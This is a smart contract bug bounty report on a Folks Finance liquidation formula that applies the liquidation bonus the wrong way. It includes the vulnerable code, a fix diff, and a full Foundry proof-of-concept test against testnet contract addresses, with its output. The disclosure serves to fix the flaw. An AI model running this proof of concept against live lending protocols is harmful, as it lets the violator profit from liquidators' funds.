# Boost \_ Folks Finance 34174 - \[Smart Contract - Low] Bug in liquidation logic leads to stealing fund

Submitted on Tue Aug 06 2024 06:09:41 GMT-0400 (Atlantic Standard Time) by @alix\_40 for [Boost | Folks Finance](https://immunefi.com/bounty/folksfinance-boost/)

Report ID: #34174

Report type: Smart Contract

Report severity: Low

Target: <https://testnet.snowtrace.io/address/0x2cAa1315bd676FbecABFC3195000c642f503f1C9>

Impacts:

* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
* Protocol insolvency

## Description

> This report is intended to be submitted under my team account "A2Security" but I reached the report submission rate limit on the last day. Please count this report as though it were from "A2Security".

## Impact

The bug basically leads to the liquidation bonus being taken from the liquidator instead of the violator.\
This doesn't only leads to the fact that liquidations in certain conditions are not profitable for liquidators, violators will actually make a profit from being liquidated.\
About severity, We think impact is critical, but due to the fact that the faulty part of the liquidation math only affects liquidations fulfilling the condition `seizeUnderlyingCollateralAmount > violatorUnderlingCollateralBalance` we think **High** severity is fair.

## Description

In calcLiquidationAmount when seizeUnderlyingCollateralAmount > violatorUnderlingCollateralBalance the repayBorrowAmount is recalculated to reflect the actual seized collateral: <https://github.com/A2-Security/folks-finance-boost/blob/07fa4f5095d38c720d86558aaf02fc04b8e011c4/contracts/hub/logic/LiquidationLogic.sol#L180-L221>

```solidity
    function calcLiquidationAmounts(
        DataTypes.LiquidationLoansParams memory loansParams,
---
        
        {
            //@note sizeCollateralAmount = (repayBorrowAmount * priceBorrowAsset / collateralPrice) * (1 + liquidationBonus) | correct decimals conversion and conversion
            uint256 seizeUnderlyingCollateralAmount =
                repayBorrowAmount.convToSeizedCollateralAmount(collPriceFeed.price, collPriceFeed.decimals, borrPriceFeed.price, borrPriceFeed.decimals, borrowLoanPool.liquidationBonus);
            uint256 collDepositInterestIndex = collPool.getUpdatedDepositInterestIndex();
            // get the actual amount of collateral violator have (not the ftoken);
            uint256 violatorUnderlingCollateralBalance = violatorLoanCollateral.balance.toUnderlingAmount(collDepositInterestIndex);
>>            if (seizeUnderlyingCollateralAmount > violatorUnderlingCollateralBalance) {
                seizeUnderlyingCollateralAmount = violatorUnderlingCollateralBalance;
                //@audit-issue repayBorrowAmount = (sizeCollateralAmount * priceCollateral / priceBorrowedAsset) * (1 + liquidationBonus) | incorrect calc
                repayBorrowAmount =
>>                    seizeUnderlyingCollateralAmount.convToRepayBorrowAmount(collPriceFeed.price, collPriceFeed.decimals, borrPriceFeed.price, borrPriceFeed.decimals, borrowLoanPool.liquidationBonus);
            }
```

the calculation is incorrect , cause we should divide by 1+liquidationBonus since we are calculating back from collateralsiezed to repay amount:

```solidity
    function convToRepayBorrowAmount(uint256 collAmount, uint256 collPrice, uint8 collDecimals, uint256 borrPrice, uint8 borrDecimals, uint256 liquidationBonus) internal pure returns (uint256) {
     >>   return Math.mulDiv(convertAssetAmount(collAmount, collPrice, collDecimals, borrPrice, borrDecimals), (MathUtils.ONE_4_DP + liquidationBonus), MathUtils.ONE_4_DP);
    }
```

As it is implemented the liquidationBonus is given to the violator instead of the liquidator. To fix this we need to adjust the formula so that we augment the debt from the equivalent amount of seized coll + liquidation Bonus (and not reduce it by the liquidationBonus) this should be:

```solidity
    Math.mulDiv(convertAssetAmount(collAmount, collPrice, collDecimals, borrPrice, borrDecimals), MathUtils.ONE_4_DP, (MathUtils.ONE_4_DP + liquidationBonus));
```

## Math

This is how it is currently implemented:

$\text{repayBorrowAmount} = \text{collAmount} \cdot \frac{\text{collPrice}}{\text{borrPrice}} \cdot (1 + \text{liquidationBonus})$

This incorrectly increases the repay amount, benefiting the **violator** instead The correct calculation should be (to benefit the liquidator):

$\text{repayBorrowAmount} = \text{collAmount} \cdot \frac{\text{collPrice}}{\text{borrPrice}} \cdot \frac{1}{(1 + \text{liquidationBonus})}$

## Recomendation

To mitigate this we simply need to adjust `convToRepayBorrowAmount()`

```diff
    function convToRepayBorrowAmount(uint256 collAmount, uint256 collPrice, uint8 collDecimals, uint256 borrPrice, uint8 borrDecimals, uint256 liquidationBonus) internal pure returns (uint256) {
--     return Math.mulDiv(convertAssetAmount(collAmount, collPrice, collDecimals, borrPrice, borrDecimals), (MathUtils.ONE_4_DP + liquidationBonus), MathUtils.ONE_4_DP);
++    Math.mulDiv(convertAssetAmount(collAmount, collPrice, collDecimals, borrPrice, borrDecimals), MathUtils.ONE_4_DP, (MathUtils.ONE_4_DP + liquidationBonus));
    }
```

## Proof of concept

## Proof of Concept

Result of runing poc:

```log
Ran 1 test for test/pocs/pocs.sol:Pocs
[PASS] test_poc_04() (gas: 2486946)
Logs:
  Violator's borrow before liquidation (USDC)      : 2000000000
  Violator's borrow after liquidation (USDC)       : 1450000002
  Violator's collateral before liquidation (USDC)  : 499999999
  Violator's collateral after liquidation (USDC)   : 1
  Liquidiator's collateral before liquidation (USDC): 19999999999
  Liquidiator's collateral after liquidation (USDC) : 20499999997
  Liquidiator's borrow after liquidation (USDC)     : 549999998
  Alice liquidated bob successfully!, But she got : 499999998 USDC as collateral
  However she got                                 : 549999998 USDC as a loan which made here lose in collateral and bob steal here money

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 651.55ms (21.81ms CPU time)

Ran 1 test suite in 654.22ms (651.55ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

To run the test please make sure to use `--via-ir` option please run this command `forge test --mt test_poc_04 --via-ir -vv`

add the following file `test/pocs/pocs.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.23;

import "./base_test.sol";
import "contracts/oracle/storage/NodeDefinition.sol";

contract Pocs is baseTest {



    function test_poc_04() public {
        // mimic pool have enough usdc balance to allow borrow :
        deal(USDC_TOKEN, address(hubPoolUsdc), 1e12);
        // update caps and fix prices to avoid errors :

        vm.startPrank(LISTING_ROLE);
        loanManager.updateLoanPoolCaps(1, hubPoolUsdc.getPoolId(), 1e12, 1e11);
        hubPoolUsdc.updateCapsData(HubPoolState.CapsData(type(uint64).max, type(uint64).max, 1e18));
        loanManager.updateLoanPoolCaps(1, hubPoolAvax.getPoolId(), type(uint64).max, type(uint64).max);
        hubPoolAvax.updateCapsData(HubPoolState.CapsData(type(uint64).max, type(uint64).max, 1e18));
        // note set usdc price to 1 using constant error to avoid erros later afer skipping days
        bytes memory params = abi.encode(1e18);
        bytes32[] memory parents = new bytes32[](0);
        bytes32 usdc_constant_node = 0x0d40261f4e58e0a12a3ba4bca3e3b8f06c251e1a9c65cde23dae8813e3780310;
        params = abi.encode(25e18);
        bytes32 avax_constant_node = nodeManager.registerNode(NodeDefinition.NodeType.CONSTANT, params, parents);
        oracleManager.setNodeId(hubPoolUsdc.getPoolId(), usdc_constant_node, 6);
        oracleManager.setNodeId(hubPoolAvax.getPoolId(), avax_constant_node, 18);

        vm.stopPrank();

        // Bob deposits collateral to loanId 2
        uint256 bobDepositAvax = 380e18 + 1e18; // (9500 + 25)USD
        uint256 bobDepositUsdc = 500e6; // 200 USDC
        uint256 borrowAbleValue = 5000e18; // collateral factor of 0.5 in both loans and deposited value is 10k USD
        _approveUsdc(bob, address(spokeUsdc), bobDepositUsdc);
        _deposit(bob, bobAccountId, bobLoanIds[1], bobDepositUsdc, spokeUsdc);
        _depositAvax(bob, bobAccountId, bobLoanIds[1], bobDepositAvax);

        // Bob borrows max amount from loanId 2 , borrow 10% avax and 90% usdc :
        uint256 borrowAmountUsdc = borrowAbleValue * 4e17 / 1e18 * 1e6 / 1e18; // 90% of borrowable value in usdc
        uint256 borrowAmountAvax = borrowAbleValue * 6e17 / 1e18 * 1e18 / 25e18; // 10% of borrowable value in avax

        _borrowVariable(bob, bobAccountId, bobLoanIds[1], hubPoolUsdc.poolId(), borrowAmountUsdc);
        _borrowVariable(bob, bobAccountId, bobLoanIds[1], hubPoolAvax.poolId(), borrowAmountAvax);
        // @note : we don't skip any time to keep the indexes the same for easy comparison :
        //  the price of avax falls so loan will be liquidatable:
        vm.startPrank(LISTING_ROLE);
        params = abi.encode(16e18);
        bytes32 avax_constant_Newnode = nodeManager.registerNode(NodeDefinition.NodeType.CONSTANT, params, parents);
        oracleManager.setNodeId(hubPoolAvax.getPoolId(), avax_constant_Newnode, 18);
        vm.stopPrank();
        // update indexes:
        hubPoolUsdc.updateInterestIndexes();
        // Alice deposits collateral that can repay Bob's loan
        uint256 aliceDeposit = 1e10 * 2; // 20000 USDC
        _approveUsdc(alice, address(spokeUsdc), aliceDeposit);
        _deposit(alice, aliceAccountId, aliceLoanIds[1], aliceDeposit, spokeUsdc);

        // Get Bob's and alice loan details before liquidation
        (,,,, LoanManagerState.UserLoanCollateral[] memory bobCollBefore, LoanManagerState.UserLoanBorrow[] memory bobBorrBefore) = loanManager.getUserLoan(bobLoanIds[1]);
        (,,,, LoanManagerState.UserLoanCollateral[] memory aliceCollBefore,) = loanManager.getUserLoan(aliceLoanIds[1]);
        // calculate the usdc value before using the latest indexes :
        uint256 depositIndex = hubPoolUsdc.getUpdatedDepositInterestIndex();
        uint256 bobCollBeforeUsdc = MathUtils.toUnderlingAmount(bobCollBefore[0].balance, depositIndex);
        uint256 aliceCollBeforeUsdc = MathUtils.toUnderlingAmount(aliceCollBefore[0].balance, depositIndex);

        // Alice liquidates Bob
        uint256 maxRepayAmount = type(uint256).max;
        uint256 minSeizedAmount = 450e6;
        uint8 usdcPoolId = hubPoolUsdc.poolId();
        _liquidate(alice, aliceAccountId, bobLoanIds[1], aliceLoanIds[1], usdcPoolId, usdcPoolId, maxRepayAmount, minSeizedAmount);
        // Get Bob's and Alice's loan details after liquidation
        (,,,, LoanManagerState.UserLoanCollateral[] memory bobCollAfter, LoanManagerState.UserLoanBorrow[] memory bobBorrAfter) = loanManager.getUserLoan(bobLoanIds[1]);
        (,,,, LoanManagerState.UserLoanCollateral[] memory aliceCollAfter, LoanManagerState.UserLoanBorrow[] memory aliceBorrAfter) = loanManager.getUserLoan(aliceLoanIds[1]);
        // get the latest deposit index to calculate the amount of collateral seized :
        depositIndex = hubPoolUsdc.getUpdatedDepositInterestIndex();
        uint256 bobCollAfterUsdc = MathUtils.toUnderlingAmount(bobCollAfter[0].balance, depositIndex);
        uint256 aliceCollAfterUsdc = MathUtils.toUnderlingAmount(aliceCollAfter[0].balance, depositIndex);
        console.log("Violator's borrow before liquidation (USDC)      :", bobBorrBefore[0].balance);
        console.log("Violator's borrow after liquidation (USDC)       :", bobBorrAfter[0].balance);
        console.log("Violator's collateral before liquidation (USDC)  :", bobCollBeforeUsdc);
        console.log("Violator's collateral after liquidation (USDC)   :", bobCollAfterUsdc);
        console.log("Liquidiator's collateral before liquidation (USDC):", aliceCollBeforeUsdc);
        console.log("Liquidiator's collateral after liquidation (USDC) :", aliceCollAfterUsdc);
        console.log("Liquidiator's borrow after liquidation (USDC)     :", aliceBorrAfter[0].balance);
        // avax borrow should not change :
        assertEq(bobBorrBefore[1].balance, bobBorrAfter[1].balance);
        assertEq(bobCollBefore[1].balance, bobCollAfter[1].balance);
        // console log the conclusion :
        console.log("Alice liquidated bob successfully!, But she got :", aliceCollAfterUsdc - aliceCollBeforeUsdc, "USDC as collateral");
        console.log("However she got                                 :", aliceBorrAfter[0].balance, "USDC as a loan which made here lose in collateral and bob steal here money");
    }

    function _liquidate(
        address liquidator,
        bytes32 liquidatorAcountId,
        bytes32 violatorLoan,
        bytes32 liquidatorLoan,
        uint8 borrowPoolId,
        uint8 collateralPoolId,
        uint256 maxRepayAmount,
        uint256 minSeizedAmount
    ) internal {
        bytes memory data = abi.encodePacked(violatorLoan, liquidatorLoan, collateralPoolId, borrowPoolId, maxRepayAmount, minSeizedAmount);
        vm.prank(liquidator);
        hub.directOperation(Messages.Action.Liquidate, liquidatorAcountId, data);
    }
}

```

please add the testbase to `test/pocs/base_test.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "@forge-std/Test.sol";
import "contracts/hub/Hub.sol";
import "contracts/spoke/SpokeToken.sol";
import "contracts/spoke/SpokeCommon.sol";
import "contracts/hub/HubPool.sol";
import "contracts/hub/LoanManager.sol";
import "contracts/bridge/libraries/Messages.sol";
import "contracts/hub/AccountManager.sol";
import "contracts/bridge/BridgeRouter.sol";
import "contracts/bridge/HubAdapter.sol";
import "contracts/oracle/modules/NodeManager.sol";
import "contracts/hub/OracleManager.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

contract baseTest is Test {
    using SafeERC20 for address;
    // Hub public hub;

    uint256 mainnetFork;
    bytes32 public constant PREFIX = "HUB_ADAPTER_V1";
    address constant HUB_ADDRESS = 0xaE4C62510F4d930a5C8796dbfB8C4Bc7b9B62140; // Assuming this is the Hub address
    address constant SPOKE_COMMON = 0x6628cE08b54e9C8358bE94f716D93AdDcca45b00;
    address constant SPOKE_USDC = 0x89df7db4af48Ec7A84DE09F755ade9AF1940420b;
    address constant HUBPOOL_USDC = 0x1968237f3a7D256D08BcAb212D7ae28fEda72c34;
    address constant HUBPOOL_AVAX = 0xd90B7614551E799Cdef87463143eCe2efd4054f9;
    address constant SPOKE_AVAX = 0xBFf8b4e5f92eDD0A5f72b4b0E23cCa2Cc476ce2a;
    address constant LOAN_MANAGER = 0x2cAa1315bd676FbecABFC3195000c642f503f1C9;
    address constant ACCOUNT_MANAGER = 0x3324B5BF2b5C85999C6DAf2f77b5a29aB74197cc;
    address constant USDC_TOKEN = 0x5425890298aed601595a70AB815c96711a31Bc65;
    address constant ADAPTER = 0xf472ab58969709De9FfEFaeFFd24F9e90cf8DbF9;
    address constant LISTING_ROLE = 0x16870a6A85cD152229B97d018194d66740f932d6;
    address constant BRIDGE_ROUTER_HUB = 0xa9491a1f4f058832e5742b76eE3f1F1fD7bb6837;
    address constant ORACLE_MANAGER = 0x46c425F4Ec43b25B6222bcc05De051e6D3845165;
    address constant NODE_MANAGER = 0xA758c321DF6Cd949A8E074B22362a4366DB1b725;
    uint16 constant STABELE_LOAN_TYPE_ID = 1;
    uint16 constant VARIABLE_LOAN_TYPE_ID = 2;
    uint16 constant CHAIN_ID = 1; // Assuming Ethereum mainnet

    Hub hub;
    SpokeCommon spokeCommon;
    AccountManager accountManager;
    SpokeToken spokeUsdc;
    SpokeToken spokeAvax;
    HubPool hubPoolUsdc;
    HubPool hubPoolAvax;
    LoanManager loanManager;
    HubAdapter adapter;
    BridgeRouter bridgeRouterHub;
    NodeManager nodeManager;
    OracleManager oracleManager;
    Messages.MessageParams DUMMY_MESSAGE_PARAMS = Messages.MessageParams({adapterId: 1, returnAdapterId: 1, receiverValue: 0, gasLimit: 0, returnGasLimit: 0});
    ///// users account ids :
    address bob = makeAddr("bob");
    address alice = makeAddr("alice");
    bytes32 bobAccountId;
    bytes32 aliceAccountId;
    bytes32[] bobLoanIds;
    bytes32[] aliceLoanIds;

    function setUp() public {
        // Fork Avalanche mainnet
        mainnetFork = vm.createFork("https://api.avax-test.network/ext/bc/C/rpc", 35000569);
        vm.selectFork(mainnetFork);

        // Initialize contracts
        bridgeRouterHub = BridgeRouter(BRIDGE_ROUTER_HUB);
        hub = Hub(HUB_ADDRESS);
        spokeCommon = SpokeCommon(SPOKE_COMMON);
        spokeUsdc = SpokeToken(SPOKE_USDC);
        spokeAvax = SpokeToken(SPOKE_AVAX);
        hubPoolUsdc = HubPool(HUBPOOL_USDC);
        hubPoolAvax = HubPool(HUBPOOL_AVAX);
        loanManager = LoanManager(LOAN_MANAGER);
        accountManager = AccountManager(ACCOUNT_MANAGER);
        adapter = HubAdapter(ADAPTER);
        nodeManager = NodeManager(NODE_MANAGER);
        oracleManager = OracleManager(ORACLE_MANAGER);
        // create account ids for bob and alice :
        address[] memory _users = new address[](2);
        _users[0] = bob;
        _users[1] = alice;
        bytes32[] memory ids = _createAccounts(_users);
        bobAccountId = ids[0];
        aliceAccountId = ids[1];
        // create loanids for alice and bob :
        bobLoanIds.push(_createLoan(bobAccountId, bob, 1, VARIABLE_LOAN_TYPE_ID));
        bobLoanIds.push(_createLoan(bobAccountId, bob, 2, STABELE_LOAN_TYPE_ID));

        aliceLoanIds.push(_createLoan(aliceAccountId, alice, 1, VARIABLE_LOAN_TYPE_ID));
        aliceLoanIds.push(_createLoan(aliceAccountId, alice, 2, STABELE_LOAN_TYPE_ID));

        // credit bob and alice with 1M usdc and 1000 avax each :
        deal(USDC_TOKEN, bob, 1e12);
        deal(USDC_TOKEN, alice, 1e12);
        vm.deal(bob, 100000e18);
        vm.deal(alice, 100000e18);
    }
    ////////////////////////////////////// helpers ///////////////////////////////////////////

    function _creditAvax(address to, uint256 amount) internal {
        vm.deal(to, amount);
    }

    function _creditUsdc(address to, uint256 amount) internal {
        deal(USDC_TOKEN, to, amount);
    }

    function _approveUsdc(address from, address to, uint256 amount) internal {
        vm.prank(from);
        IERC20(USDC_TOKEN).approve(to, amount);
    }

    function _createAccounts(address[] memory users) internal returns (bytes32[] memory) {
        bytes32 id;
        bytes32[] memory ids = new bytes32[](users.length);
        for (uint256 i = 0; i < users.length; i++) {
            id = keccak256(abi.encode(i, "testing"));
            vm.prank(users[i]);
            spokeCommon.createAccount(DUMMY_MESSAGE_PARAMS, id, "");
            assertTrue(accountManager.isAccountCreated(id));
            ids[i] = id;
        }
        return ids;
    }

    function _createLoan(bytes32 accId, address _sender, uint256 nonce, uint16 _loanType) internal returns (bytes32) {
        bytes32 loanId = keccak256(abi.encode(accId, nonce, "loan"));
        uint16 loanType = _loanType;
        bytes32 loanName = keccak256(abi.encode(loanId, loanType));
        // create the loan :
        vm.prank(_sender);
        spokeCommon.createLoan(DUMMY_MESSAGE_PARAMS, accId, loanId, loanType, loanName);
        // check if the loan is created :
        assertTrue(loanManager.isUserLoanActive(loanId));
        return loanId;
    }

    function _createLoanAndDeposit(bytes32 _accountId, address sender, uint256 nonce, uint16 loanType, uint256 _amount, SpokeToken spoke) internal {
        bytes32 loanId = keccak256(abi.encode(_accountId, nonce, "loan"));
        uint16 loanTypeId = loanType; // or VARIABLE_LOAN_TYPE_ID
        bytes32 loanName = keccak256(abi.encode(loanId, loanTypeId));

        vm.prank(sender);
        spoke.createLoanAndDeposit(DUMMY_MESSAGE_PARAMS, _accountId, loanId, _amount, loanTypeId, loanName);
    }

    function _createLoanAndDeposit(bytes32 _accountId, address sender, bytes32 _loanId, uint16 loanType, uint256 _amount, SpokeToken spoke) internal {
        bytes32 loanId = _loanId;
        uint16 loanTypeId = loanType; // or VARIABLE_LOAN_TYPE_ID
        bytes32 loanName = keccak256(abi.encode(loanId, loanTypeId));

        vm.prank(sender);
        spoke.createLoanAndDeposit(DUMMY_MESSAGE_PARAMS, _accountId, loanId, _amount, loanTypeId, loanName);
    }

    function _borrowVariable(address sender, bytes32 _accountId, bytes32 _loanId, uint8 _poolId, uint256 _amount) internal {
        _borrow(sender, _accountId, _loanId, _poolId, _amount, 0);
    }

    function _borrowStable(address sender, bytes32 _accountId, bytes32 _loanId, uint8 _poolId, uint256 _amount, uint256 _maxStableRate) internal {
        _borrow(sender, _accountId, _loanId, _poolId, _amount, _maxStableRate);
    }

    function _borrow(address sender, bytes32 _accountId, bytes32 _loanId, uint8 _poolId, uint256 _amount, uint256 _maxStableRate) internal {
        vm.prank(sender);
        spokeCommon.borrow(DUMMY_MESSAGE_PARAMS, _accountId, _loanId, _poolId, CHAIN_ID, _amount, _maxStableRate);
    }

    function _deposit(address sender, bytes32 _accountId, bytes32 _loanId, uint256 _amount, SpokeToken spoke) internal {
        vm.prank(sender);
        spoke.deposit(DUMMY_MESSAGE_PARAMS, _accountId, _loanId, _amount);
    }

    function _depositAvax(address sender, bytes32 _accountId, bytes32 _loanId, uint256 _amount) internal {
        vm.prank(sender);
        spokeAvax.deposit{value: _amount}(DUMMY_MESSAGE_PARAMS, _accountId, _loanId, _amount);
        // spoke.deposit(DUMMY_MESSAGE_PARAMS, _accountId, _loanId, _amount);
    }

    function _withdraw(address sender, bytes32 _accountId, bytes32 _loanId, uint8 _poolId, uint256 _amount, bool isFAmount) internal {
        vm.prank(sender);
        spokeCommon.withdraw(DUMMY_MESSAGE_PARAMS, _accountId, _loanId, _poolId, CHAIN_ID, _amount, isFAmount);
    }

    function _repay(address sender, bytes32 _accountId, bytes32 _loanId, uint256 _amount, SpokeToken spoke, uint256 maxOverRepayment) internal {
        vm.prank(sender);
        spoke.repay(DUMMY_MESSAGE_PARAMS, _accountId, _loanId, _amount, maxOverRepayment);
    }

    function _repayWithCollateral(address sender, bytes32 _accountId, bytes32 _loanId, uint256 _amount, uint8 _poolId) internal {
        vm.prank(sender);
        spokeCommon.repayWithCollateral(DUMMY_MESSAGE_PARAMS, _accountId, _loanId, _poolId, _amount);
    }

    function _getMsgId() internal view returns (bytes32) {
        uint256 s = adapter.sequence();
        return keccak256(abi.encodePacked(PREFIX, s));
    }

    function _checkSeccuss(bytes32 msgId) internal {
        vm.expectEmit();
        emit BridgeRouter.MessageSucceeded(1, msgId);
    }

    function _checkMessageSeccuss() internal {
        // vm.exepctEmit(true,false,false);
        // emit BridgeRouter.MessageSuccess(0,"");
    }
}

```
